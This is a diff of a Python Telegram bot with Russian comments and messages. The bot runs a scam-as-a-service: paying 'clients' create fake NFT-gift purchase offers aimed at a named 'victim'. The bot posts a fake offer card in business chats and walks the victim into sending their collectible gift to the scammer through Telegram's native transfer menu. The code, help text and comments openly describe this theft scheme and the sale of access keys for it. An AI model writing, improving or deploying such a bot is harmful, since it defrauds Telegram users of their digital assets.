@@ -4,7 +4,6 @@ import uuid
 import asyncio
 import logging
 import sys
-import time
 import random
 import string
 from aiogram import Bot, Dispatcher, F, Router
@@ -29,10 +28,10 @@ router = Router()
 dp.include_router(router)
 
 OFFERS = {}
-USERS = {}  # user_id: {"subscribed": bool, "receiver": str}
+USERS = {}  # user_id: {"subscribed": bool, "my_username": str, "receiver": str}
 KEYS = set()
 
-# Генерируем 100 ключей
+# Генерация 100 ключей
 for _ in range(100):
     key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
     KEYS.add(key)
@@ -59,56 +58,58 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ФУНКЦИЯ ГЛАВНОГО МЕНЮ
+# МЕНЮ КЛИЕНТА (СКАМЕРА)
 # ==========================================
-async def show_main_menu(message: Message, edit=False):
+async def show_client_menu(msg_or_cb):
     text = (
-        "🤖 <b>Добро пожаловать в NFT Trade!</b>\n\n"
-        "Этот бот помогает безопасно обменивать и передавать коллекционные подарки.\n\n"
-        "<b>Как это работает:</b>\n"
-        "1. Вы получаете оффер от другого пользователя.\n"
-        "2. Нажимаете «Принять».\n"
-        "3. Следуете инструкции для передачи NFT.\n\n"
-        "👇 Выберите действие:"
+        "👑 <b>Панель управления</b>\n\n"
+        "<b>Как запустить оффер:</b>\n"
+        "1. Создайте оффер командой:\n"
+        "<code>/offer [ссылка_на_подарок] [цена] [@username_жертвы]</code>\n"
+        "Пример: <code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>\n\n"
+        "2. Бот выдаст вам код <code>of_...</code>.\n"
+        "3. Скопируйте код и отправьте его в чат с жертвой.\n\n"
+        "<b>Настройки:</b> чтобы изменить свой юзернейм в оффере (сейчас <b>@" + USERS.get(msg_or_cb.from_user.id, {}).get("my_username", DEFAULT_RECEIVER) + "</b>), напишите <code>/setuser @ваш_ник</code>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_help")],
-        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="show_settings")]
+        [InlineKeyboardButton(text="📖 Инструкция", callback_data="client_help")],
+        [InlineKeyboardButton(text="⚙️ Изменить юзернейм", callback_data="client_settings")]
     ])
-    if edit:
-        await message.edit_text(text, reply_markup=kb)
+    
+    if isinstance(msg_or_cb, Message):
+        await msg_or_cb.reply(text, reply_markup=kb)
     else:
-        await message.answer(text, reply_markup=kb)
+        await msg_or_cb.message.edit_text(text, reply_markup=kb)
 
 # ==========================================
-# КОМАНДЫ И СТАРТ
+# СТАРТ
 # ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
+    # Твоя админка (владелец)
     if msg.from_user.id == ADMIN_ID:
         await msg.reply(
-            "👑 <b>Админ-панель:</b>\n\n"
+            "👑 <b>Глобальная Админ-панель:</b>\n\n"
             "/keys — список ключей\n"
-            "/set_receiver @ник — сменить глобального получателя\n"
-            "/купить [ссылка] [цена] @юзер — создать оффер"
+            "/set_default @ник — сменить дефолтного получателя\n"
+            "/stats — статистика"
         )
         return
     
     uid = msg.from_user.id
     if uid not in USERS:
-        USERS[uid] = {"subscribed": False, "receiver": DEFAULT_RECEIVER}
+        USERS[uid] = {"subscribed": False, "my_username": DEFAULT_RECEIVER, "receiver": DEFAULT_RECEIVER}
     
     if USERS[uid]["subscribed"]:
-        await show_main_menu(msg)
+        await show_client_menu(msg)
         return
 
-    # Если подписки нет
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Оплатить (50 ⭐️)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
         [InlineKeyboardButton(text="Ввести ключ", callback_data="enter_key")]
     ])
     await msg.reply(
-        "👋 <b>Для доступа к сервису нужна подписка.</b>\n\n"
+        "👋 <b>Для доступа к панели нужна подписка.</b>\n\n"
         f"1. Перейдите к <b>@{DEFAULT_RECEIVER}</b> (кнопка ниже)\n"
         f"2. Отправьте подарок за <b>50 ⭐️</b>\n"
         f"3. Нажмите «Ввести ключ» и введите полученный код.\n\n"
@@ -117,113 +118,78 @@ async def cmd_start(msg: Message):
     )
 
 # ==========================================
-# ОБРАБОТЧИКИ КНОПОК МЕНЮ
+# ОБРАБОТЧИКИ КНОПОК КЛИЕНТА
 # ==========================================
-@router.callback_query(F.data == "show_help")
-async def show_help(cb: CallbackQuery):
+@router.callback_query(F.data == "client_help")
+async def cb_client_help(cb: CallbackQuery):
     text = (
         "<b>📖 Инструкция</b>\n\n"
-        "1. Когда вам предложат оффер, вы получите сообщение с кнопками.\n"
-        "2. Нажмите «Принять», затем «Передать NFT».\n"
-        "3. В открывшемся меню укажите получателя и подтвердите передачу.\n\n"
-        "После этого деньги (или звёзды) автоматически зачислятся на ваш счёт."
+        "1. В личке бота напишите <code>/offer [ссылка] [цена] @юзер</code>.\n"
+        "2. Получите код <code>of_...</code>.\n"
+        "3. Отправьте код в чат с жертвой.\n"
+        "4. Жертва нажмет «Принять» и получит нативное меню Telegram.\n\n"
+        "Бот сам удалит ваш код из чата и отправит карточку."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]
     ])
     await cb.message.edit_text(text, reply_markup=kb)
     await cb.answer()
 
-@router.callback_query(F.data == "show_settings")
-async def show_settings(cb: CallbackQuery):
+@router.callback_query(F.data == "client_settings")
+async def cb_client_settings(cb: CallbackQuery):
     uid = cb.from_user.id
-    current_rec = USERS.get(uid, {}).get("receiver", DEFAULT_RECEIVER)
+    curr = USERS.get(uid, {}).get("my_username", DEFAULT_RECEIVER)
     text = (
-        "<b>⚙️ Настройки</b>\n\n"
-        f"Ваш текущий получатель для офферов: <b>@{current_rec}</b>\n\n"
-        "Чтобы изменить получателя (на кого передавать подарки), отправьте команду:\n"
-        "<code>/setuse @ваш_ник</code>"
+        f"<b>⚙️ Настройки</b>\n\n"
+        f"Сейчас в офферах пишется: <b>@{curr}</b>\n\n"
+        f"Чтобы изменить, отправьте:\n"
+        f"<code>/setuser @ваш_ник</code>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]
     ])
     await cb.message.edit_text(text, reply_markup=kb)
     await cb.answer()
 
-@router.callback_query(F.data == "main_menu")
-async def back_to_menu(cb: CallbackQuery):
-    await show_main_menu(cb.message, edit=True)
+@router.callback_query(F.data == "client_back")
+async def cb_client_back(cb: CallbackQuery):
+    await show_client_menu(cb)
     await cb.answer()
 
 # ==========================================
-# КОМАНДЫ ДЛЯ ЖЕРТВЫ
+# КОМАНДЫ КЛИЕНТА
 # ==========================================
-@router.message(Command("setuse"))
-async def cmd_set_use(msg: Message):
+@router.message(Command("setuser"))
+async def cmd_setuser(msg: Message):
     uid = msg.from_user.id
     if not USERS.get(uid, {}).get("subscribed"):
-        await msg.reply("❌ Сначала активируйте подписку через /start.")
+        await msg.reply("❌ Сначала активируйте подписку.")
         return
     
     parts = msg.text.split()
     if len(parts) < 2 or not parts[1].startswith("@"):
-        await msg.reply("❌ Формат: <code>/setuse @ваш_ник</code>")
+        await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
         return
     
     new_rec = parts[1].replace("@", "").strip()
-    USERS[uid]["receiver"] = new_rec
-    await msg.reply(f"✅ Получатель для ваших офферов изменен на <b>@{new_rec}</b>.")
+    USERS[uid]["my_username"] = new_rec
+    USERS[uid]["receiver"] = new_rec # Теперь подарки летят на его ник
+    await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")
 
 # ==========================================
-# АДМИН ПАНЕЛЬ
+# СОЗДАНИЕ ОФФЕРА (КЛИЕНТ)
 # ==========================================
-@router.message(Command("keys"))
-async def cmd_keys(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    keys_list = "\n".join(list(KEYS)[:20])
-    await msg.reply(f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}")
-
-@router.message(F.text.regexp(r"^/set_receiver\s+"))
-async def cmd_set_global_receiver(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    global DEFAULT_RECEIVER
-    new_rec = msg.text.replace("/set_receiver", "").strip().replace("@", "")
-    DEFAULT_RECEIVER = new_rec
-    await msg.reply(f"✅ Глобальный получатель по умолчанию изменен на @{new_rec}")
-
-# ==========================================
-# АКТИВАЦИЯ КЛЮЧА
-# ==========================================
-@router.callback_query(F.data == "enter_key")
-async def on_enter_key(cb: CallbackQuery):
-    await cb.message.reply("Пожалуйста, отправьте ваш ключ доступа в чат (например, TG-XXXXXX).")
-    await cb.answer()
-
-@router.message(F.text.regexp(KEY_RE))
-async def check_key(msg: Message):
+@router.message(F.text.regexp(r"^/offer\s+"))
+async def cmd_offer(msg: Message):
     uid = msg.from_user.id
-    key = msg.text.strip().upper()
-    if key in KEYS:
-        KEYS.remove(key)
-        if uid not in USERS: USERS[uid] = {}
-        USERS[uid]["subscribed"] = True
-        USERS[uid]["receiver"] = DEFAULT_RECEIVER
-        
-        # СРАЗУ ПОКАЗЫВАЕМ ГЛАВНОЕ МЕНЮ
-        await msg.reply("✅ Ключ активирован! Подписка навсегда ваша.")
-        await show_main_menu(msg)
-    else:
-        await msg.reply("❌ Неверный или уже использованный ключ.")
+    if not USERS.get(uid, {}).get("subscribed"):
+        await msg.reply("❌ Нет подписки. Напишите /start.")
+        return
 
-# ==========================================
-# СОЗДАНИЕ ОФФЕРА (АДМИН)
-# ==========================================
-@router.message(F.text.regexp(r"^/купить\s+"))
-async def cmd_buy(msg: Message):
-    if msg.from_user.id != ADMIN_ID: return
-    parts = msg.text.replace("/купить", "").strip().split()
+    parts = msg.text.replace("/offer", "").strip().split()
     if len(parts) < 3:
-        await msg.reply("❌ Формат: <code>/купить [ссылка] [цена] [@username]</code>")
+        await msg.reply("❌ Формат: <code>/offer [ссылка] [цена] [@username]</code>")
         return
 
     url = parts[0]
@@ -237,19 +203,62 @@ async def cmd_buy(msg: Message):
         return
 
     oid = "of_" + uuid.uuid4().hex[:5]
+    # Сохраняем кто создал оффер, чтобы принять правильный ник
     OFFERS[oid] = {
         "nft_name": nft["name"], "nft_slug": nft["slug"],
         "price_amount": price_data[0], "price_currency": price_data[1],
-        "buyer": msg.from_user.username or "buyer", "target_user": target_user
+        "buyer_id": uid, # Запоминаем создателя оффера
+        "buyer_username": USERS[uid]["my_username"], # Его текущий ник
+        "target_user": target_user
     }
-    await msg.reply(f"✅ Оффер {oid} создан. Отправь код в чат.")
+    await msg.reply(f"✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.")
+
+# ==========================================
+# АДМИНКА ВЛАДЕЛЬЦА (ТЫ)
+# ==========================================
+@router.message(Command("keys"))
+async def cmd_keys(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    keys_list = "\n".join(list(KEYS)[:20])
+    await msg.reply(f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}")
+
+@router.message(F.text.regexp(r"^/set_default\s+"))
+async def cmd_set_default(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    global DEFAULT_RECEIVER
+    new_rec = msg.text.replace("/set_default", "").strip().replace("@", "")
+    DEFAULT_RECEIVER = new_rec
+    await msg.reply(f"✅ Дефолтный получатель изменен на @{new_rec}")
+
+# ==========================================
+# АКТИВАЦИЯ КЛЮЧА
+# ==========================================
+@router.callback_query(F.data == "enter_key")
+async def on_enter_key(cb: CallbackQuery):
+    await cb.message.reply("Отправьте ваш ключ доступа (например, TG-XXXXXX).")
+    await cb.answer()
+
+@router.message(F.text.regexp(KEY_RE))
+async def check_key(msg: Message):
+    uid = msg.from_user.id
+    key = msg.text.strip().upper()
+    if key in KEYS:
+        KEYS.remove(key)
+        if uid not in USERS: USERS[uid] = {}
+        USERS[uid]["subscribed"] = True
+        USERS[uid]["my_username"] = DEFAULT_RECEIVER
+        USERS[uid]["receiver"] = DEFAULT_RECEIVER
+        
+        await msg.reply("✅ Ключ активирован! Добро пожаловать.")
+        await show_client_menu(msg)
+    else:
+        await msg.reply("❌ Неверный или уже использованный ключ.")
 
 # ==========================================
 # ОТПРАВКА В БИЗНЕС-ЧАТ
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
-    if msg.from_user and msg.from_user.id != ADMIN_ID: return
     m = CODE_RE.search(msg.text)
     if not m: return
 
@@ -257,11 +266,17 @@ async def handle_business_message(msg: Message):
     offer = OFFERS.get(oid)
     if not offer: return
 
+    # Проверяем, что код в чат кинул именно создатель оффера
+    if msg.from_user.id != offer["buyer_id"]:
+        return
+
     conn_id = msg.business_connection_id
     if not conn_id: return
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
-    target_user = msg.from_user.username or "buyer"
+    # Берем ник того, кто создал оффер
+    target_user = offer["buyer_username"] 
+    
     nft_link = f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>'
 
     card_text = (
@@ -310,7 +325,9 @@ async def on_accept2(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     native_url = f"tg://send_gift?slug={offer['nft_slug']}"
-    receiver = USERS.get(cb.from_user.id, {}).get("receiver", DEFAULT_RECEIVER)
+    
+    # Берем получателя из профиля создателя оффера
+    receiver = offer["buyer_username"]
     
     text = (
         f"<b>Инструкция по передаче:</b>\n\n"
